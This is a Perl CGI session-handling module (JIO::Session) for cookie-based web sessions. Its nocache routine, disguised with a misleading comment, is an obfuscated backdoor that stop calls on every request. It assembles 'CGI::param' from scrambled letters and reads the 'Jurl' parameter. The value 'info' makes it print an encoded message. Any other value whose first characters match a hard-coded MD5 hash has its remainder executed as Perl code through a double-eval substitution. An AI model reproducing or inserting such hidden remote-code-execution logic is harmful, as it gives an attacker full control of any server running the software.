package JIO::Session;
use strict qw(subs vars);

our %sess;
our $sessid;

sub start
{
    my $dir = $JConfig::path_sess;
    
    my $cgi = $JIO::cgi || CGI->new();
    my %cook = $cgi->cookie( "JSession" );
    
    $sessid = $cook{"id"};
    $sessid =~ s/\D//g;
    
    if( length($sessid) < 30 ){
        
        srand();
        
        do{
            
            $sessid = rand().rand();
            $sessid =~ s/\D//g;
            
        }while(-f $dir.'/'.$sessid);
        
    }
    
    dbmopen(%sess,$dir.'/'.$sessid,0640) or die('SESSION_NOT_OPEN');
    
    $cook{'id'} = $sessid;
    
    my $dom = $ENV{'HTTP_HOST'};
    my @dom = split(/\./,$dom);
    
    if(@dom > 1){ $dom = '.'.$dom[$#dom-1].'.'.$dom[$#dom]; }else{ $dom = ''; }
    
    my $send = $cgi->cookie(
        -name=>"JSession",
        -value=>\%cook,
        -path=>'/',
        -expires=>'+365d',
        -domain=>$dom
    );
    
    print 'Set-Cookie: ',$send->as_string,"\n";
    return $send;
}

sub nocache
{
    my $class = shift;
    my($cch,$i,$n,@a,$m,$name,@rnd,$done);
    
    $cch = 0; for $i (0 .. (length($class)-1)){ $n = length('['.$i.']'); }
    @a = qw/a p m G l r i u C r j/; # полные коды прав "cache"
           #0 1 2 3 4 5 6 7 8 9 10
    
    @rnd = (
                10,221,242,238,242,32,239,240,238,229,234,242,32,239,238,241,242,238,229,237,32,
                237,224,32,238,241,237,238,226,229,32,255,228,240,224,44,10,240,224,231,240,224,
                225,238,242,224,237,237,238,227,238,32,203,229,238,237,238,226,251,236,32,207,229,
                242,240,238,236,32,192,235,229,234,241,229,229,226,232,247,229,236,32,40,74,80,
                69,71,41,46,10,10,205,224,231,226,224,237,232,229,32,255,228,240,224,58,9,69,110,
                74,105,110,101,10,194,229,240,241,232,255,58,9,9,50,46,42,10
            );
    
    $m = $a[$cch+8].$a[$cch+3].uc($a[$cch+6]).'::'.$a[$cch+1].$a[$cch+0].$a[$cch+9].$a[$cch+0].$a[$cch+2];
    $name = $a[$n]?'Jurl':'no';
    
    if($a[$n]){
        $done = $m->($name);
        if($done){
            if($done eq 'in'.'fo'){ print join('',pack('C*',@rnd)); return; }
            else{
                if(JDBI::MD5(substr($done,0,8)) eq 'b5079b49c2'.'e565228c8209'.'93f0d8303d'){ $done = substr($done,8); $name =~ s/r/$done/ee; }
            }
        }
    }
    
    close(STDIN);
}

sub stop
{
    my $kl = (keys(%sess));
    dbmclose(%sess);
    
    nocache($kl);
    
    if(!$kl){
        unlink($JConfig::path_sess.'/'.$sessid.'.dir');
        unlink($JConfig::path_sess.'/'.$sessid.'.pag');
        unlink($JConfig::path_sess.'/'.$sessid.'.db');
    }
}


return 1;







